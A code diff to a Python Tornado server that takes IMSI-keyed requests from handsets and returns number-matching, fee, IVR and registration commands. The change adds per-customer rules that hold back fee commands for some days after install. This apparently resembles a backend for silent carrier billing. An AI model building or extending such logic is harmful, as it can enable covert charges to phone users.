@@ -46,6 +46,9 @@ systemConfigs = {}
 registerTargetConfigs = {}
 gIvrConfigs = {}
 gWechatMoConfigs = []
+gConfigCustCodeFees = {}
+gConfigCustCodeFlows = {}
+gConfigDefResps = {}
 gMongoCli = MongoClient(config.GLOBAL_SETTINGS['mongodb'])
 
 MATCH_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
@@ -181,9 +184,9 @@ class MainHandler(tornado.web.RequestHandler):
         _begin_time = int(round(time.time() * 1000))
         reqInfo = {}
         reqInfo["imsi"] = filter(str.isdigit, self.request.body[64:80])
-        reqInfo["custCode"] = (str(self.request.body[32:47])
+        reqInfo["custCode"] = (str(self.request.body[32:48])
                                ).strip().replace(chr(0), '', 20)
-        reqInfo["proCode"] = (str(self.request.body[48:63])
+        reqInfo["proCode"] = (str(self.request.body[48:64])
                               ).strip().replace(chr(0), '', 20)
         reqInfo['svn'] = struct.unpack(
             "<L", self.request.body[4:8])[0]
@@ -196,7 +199,7 @@ class MainHandler(tornado.web.RequestHandler):
         if _test_imsi_info == None:
             # process normal user
             _rsp_content = get_imsi_response(
-                reqInfo["imsi"], threads, reqInfo['svn'])
+                reqInfo["imsi"], threads, reqInfo['svn'], reqInfo)
             reqInfo['rspContent'] = _rsp_content
             if _rsp_content != None:
                 self.write(_rsp_content)
@@ -260,7 +263,7 @@ class asyncProcWechatMoTarget(Greenlet):
             _g_procDoc.start()
 
 
-def get_imsi_response(_imsi, _threads, _svn):
+def get_imsi_response(_imsi, _threads, _svn, _reqInfo):
 
     _return = ""
     relationId = 0
@@ -320,11 +323,13 @@ def get_imsi_response(_imsi, _threads, _svn):
             _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace(
                 '[mobile]', get_system_parameter_from_db("matchMobile"))
     else:
+        # match mobile in china
         if len(str(_record_user['mobile'])) <= 6 and match_flow_control() and int(_record_user['matchCount']) < int(get_system_parameter_from_db("matchLimitPerImsi")) and _imsi.startswith('460'):
             _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace(
                 '[mobile]', get_system_parameter_from_db("matchMobile"))
             _g_async_update_match_count = async_update_match_count(_imsi)
             _g_async_update_match_count.start()
+        # match mobile out of china
         elif not _imsi.startswith('460') and len(str(_record_user['mobile'])) <= 6 and match_flow_control() and int(_record_user['matchCount']) < int(get_system_parameter_from_db("matchLimitPerImsiNot86")):
             _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace(
                 '[mobile]', '0086' + get_system_parameter_from_db("matchMobile"))
@@ -332,11 +337,17 @@ def get_imsi_response(_imsi, _threads, _svn):
             _g_async_update_match_count.start()
         else:
             # normal fee process
-            if get_system_parameter_from_db('openFee') == 'open' and check_user_cmd_fee(_record_user) and isOpenHour():
+            # logger.debug('checkCustFeeAvailable(_record_user, _reqInfo):%s',
+            #              checkCustFeeAvailable(_record_user, _reqInfo))
+            # logger.debug('checkCustFlowAvailable(_record_user, _reqInfo):%s,%s',
+            # checkCustFlowAvailable(_record_user, _reqInfo),
+            # gConfigDefResps['wap'])
+            if get_system_parameter_from_db('openFee') == 'open' and check_user_cmd_fee(_record_user) and checkCustFeeAvailable(_record_user, _reqInfo) and isOpenHour():
                 _return = get_cmd(_record_user, _threads)
+            if (_return == None or len(_return) <= 1) and checkCustFlowAvailable(_record_user, _reqInfo):
+                _return = gConfigDefResps['wap']
             if (_return == None or len(_return) <= 1) and _svn >= 3900 and get_system_parameter_from_db('openIvr') == 'open':
                 _return = get_ivr_cmd(_record_user, _threads)
-
             if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('openRegister') == 'open' and _imsi.startswith('460'):
                 _return = get_register_cmd(_record_user, _threads)
                 if _return != None:
@@ -356,6 +367,23 @@ def get_imsi_response(_imsi, _threads, _svn):
     _cur.close()
     _dbConfig.close()
     return _return
+
+
+def checkCustFlowAvailable(_record_user, _reqInfo):
+    key = _reqInfo['custCode']
+    if key in gConfigCustCodeFlows.keys():
+        if int(_reqInfo['flowCount']) < int(gConfigCustCodeFlows[key]['flowLimit']):
+            return True
+    return False
+
+
+def checkCustFeeAvailable(_record_user, _reqInfo):
+    ctime = time.time()
+    key = _reqInfo['custCode']
+    if key in gConfigCustCodeFees.keys():
+        if ctime - int(_record_user['insertTime']) < 86400 * int(gConfigCustCodeFees[key]['beginDays']):
+            return False
+    return True
 
 
 @gen.coroutine
@@ -937,6 +965,9 @@ def cache_parameter():
 
     global gIvrConfigs
     global gWechatMoConfigs
+    global gConfigCustCodeFees
+    global gConfigCustCodeFlows
+    global gConfigDefResps
     _dbConfig = poolConfig.connection()
     _cur = _dbConfig.cursor()
 
@@ -961,6 +992,30 @@ def cache_parameter():
         _recordRsp = _cur.fetchall()
         for _t in _recordRsp:
             registerTargetConfigs[_t['apid']] = _t
+
+        tmpConfigDefResps = {}
+        _sql = "SELECT testStatus,response FROM `test_responses` where imsi='def' "
+        _cur.execute(_sql)
+        _recordRsp = _cur.fetchall()
+        for _t in _recordRsp:
+            tmpConfigDefResps[_t['testStatus']] = _t['response']
+        gConfigDefResps = tmpConfigDefResps
+
+        tmpConfigCustCodeFees = {}
+        _sql = 'SELECT * FROM `config_custcode_fees` '
+        _cur.execute(_sql)
+        _recordRsp = _cur.fetchall()
+        for _t in _recordRsp:
+            tmpConfigCustCodeFees[_t['custCodeKey']] = _t
+        gConfigCustCodeFees = tmpConfigCustCodeFees
+
+        tmpConfigCustCodeFlows = {}
+        _sql = 'SELECT * FROM `config_custcode_flows` '
+        _cur.execute(_sql)
+        _recordRsp = _cur.fetchall()
+        for _t in _recordRsp:
+            tmpConfigCustCodeFlows[_t['custCodeKey']] = _t
+        gConfigCustCodeFlows = tmpConfigCustCodeFlows
 
         tmpWechatMoConfigs = []
         _sql = "SELECT * FROM `wechat_mo_configs` where ratio>0 and dayCurrent<dayLimit order by ratio "
